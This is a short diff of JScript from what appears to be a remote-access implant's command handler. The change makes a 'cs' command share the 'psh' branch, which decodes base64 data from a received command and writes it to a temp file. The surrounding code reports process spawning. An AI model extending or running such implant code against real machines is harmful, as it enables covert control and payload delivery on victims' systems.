@@ -117,7 +117,7 @@ function main()
 		    retval = "[+] Spawn success..."
 	    }
 
-      else if(jsObject.cmnd.split(" ")[0] == "psh") {
+      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
         msb = jsObject.cmnd.split(" ")[1]
         msbdata = b64d(jsObject.cmnd.split(" ")[2])
